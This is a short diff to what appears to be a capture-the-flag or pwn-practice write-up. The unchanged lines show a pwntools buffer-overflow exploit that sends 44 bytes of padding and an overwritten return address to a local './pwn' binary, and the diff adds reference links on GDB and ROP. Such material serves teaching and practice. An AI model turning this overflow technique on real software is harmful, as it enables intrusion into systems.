@@ -79,3 +79,7 @@ r = process("./pwn")
 padding = (b"a"*44)
 add = p32(0x080491c6)
 r.sendline(padding+add)
+
+## REF
+> [GDB](https://ithelp.ithome.com.tw/articles/10227380)
+> [ROP](https://tech-blog.cymetrics.io/posts/crystal/pwn-intro-2/)
